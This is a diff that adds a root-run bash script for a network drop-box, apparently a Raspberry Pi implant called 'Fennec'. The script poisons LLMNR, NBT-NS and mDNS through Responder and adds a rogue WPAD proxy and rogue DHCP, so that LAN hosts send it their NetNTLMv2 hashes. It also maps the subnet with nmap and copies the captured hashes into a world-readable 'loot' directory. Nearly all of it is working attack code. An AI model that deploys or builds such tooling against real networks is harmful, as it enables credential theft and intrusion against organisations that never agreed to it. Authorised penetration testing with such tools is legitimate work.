@@ -1,0 +1,89 @@
+#!/bin/bash
+#
+# Mole orchestrator (Fennec drop-box module). Runs as root via fennec-mole.service.
+# Coerces LAN hosts into authenticating to the Pi and captures their NetNTLMv2
+# hashes with Responder (LLMNR / NBT-NS / mDNS poisoning, plus a rogue WPAD proxy
+# and rogue DHCP), maps the subnet with nmap, and consolidates the captured
+# hashes where the launcher's user can read them.
+#
+# This is capture only: it does not relay credentials or modify Active Directory.
+#
+set -u
+
+LOOT=/tmp/fennec-mole
+RESPONDER=/opt/Responder/Responder.py
+
+mkdir -p "$LOOT"
+chmod 755 "$LOOT"
+rm -f "$LOOT"/hashes.txt "$LOOT"/cracked.json "$LOOT"/hosts.json \
+      "$LOOT"/hosts.grep "$LOOT"/meta.json "$LOOT"/run.log
+
+# Interface carrying the default route (the Ethernet drop link in normal use).
+IFACE=$(ip route show default 2>/dev/null | awk '/default/{print $5; exit}')
+[ -z "$IFACE" ] && IFACE=eth0
+
+IP=$(ip -4 addr show "$IFACE" 2>/dev/null | awk '/inet /{print $2; exit}' | cut -d/ -f1)
+SUBNET=""
+[ -n "$IP" ] && SUBNET="$(echo "$IP" | cut -d. -f1-3).0/24"
+
+printf '{"iface":"%s","subnet":"%s","started":%s}\n' \
+    "$IFACE" "$SUBNET" "$(date +%s)" > "$LOOT/meta.json"
+chmod 644 "$LOOT/meta.json"
+
+pids=()
+cleanup() {
+    kill "${pids[@]}" 2>/dev/null
+    pkill -f "$RESPONDER" 2>/dev/null
+    exit 0
+}
+trap cleanup TERM INT
+
+# Subnet map (best effort): ping-sweep, then flatten to JSON for the launcher.
+if [ -n "$SUBNET" ] && command -v nmap >/dev/null; then
+    nmap -sn -oG "$LOOT/hosts.grep" "$SUBNET" >/dev/null 2>&1
+    python3 - "$LOOT/hosts.grep" "$LOOT/hosts.json" <<'PY' 2>/dev/null
+import json, re, sys
+hosts = []
+try:
+    with open(sys.argv[1]) as f:
+        for line in f:
+            if "Status: Up" not in line:
+                continue
+            m = re.search(r"Host:\s+(\S+)", line)
+            if not m:
+                continue
+            ip = m.group(1)
+            mac = re.search(r"MAC Address:\s+([0-9A-Fa-f:]{17})", line)
+            ven = re.search(r"MAC Address:\s+\S+\s+\((.*?)\)", line)
+            hosts.append({"ip": ip,
+                          "mac": mac.group(1) if mac else None,
+                          "vendor": ven.group(1) if ven else None})
+except Exception:
+    pass
+json.dump(hosts, open(sys.argv[2], "w"))
+PY
+    chmod 644 "$LOOT/hosts.json" 2>/dev/null
+fi
+
+# Responder: capture NetNTLMv2 over LLMNR / NBT-NS / mDNS, with rogue WPAD + DHCP.
+if [ -f "$RESPONDER" ]; then
+    python3 "$RESPONDER" -I "$IFACE" -w -d >> "$LOOT/run.log" 2>&1 &
+    pids+=($!)
+else
+    echo "Responder not found at $RESPONDER" >> "$LOOT/run.log"
+fi
+
+# Keep the service in the foreground and copy Responder's NetNTLMv2 captures into
+# a world-readable file, so the launcher can read them without root.
+while true; do
+    cat /opt/Responder/logs/*NTLMv2*.txt \
+        /usr/share/responder/logs/*NTLMv2*.txt 2>/dev/null \
+        | sort -u > "$LOOT/hashes.txt.tmp" 2>/dev/null
+    if [ -s "$LOOT/hashes.txt.tmp" ]; then
+        mv "$LOOT/hashes.txt.tmp" "$LOOT/hashes.txt" 2>/dev/null
+        chmod 644 "$LOOT/hashes.txt" 2>/dev/null
+    else
+        rm -f "$LOOT/hashes.txt.tmp" 2>/dev/null
+    fi
+    sleep 5
+done
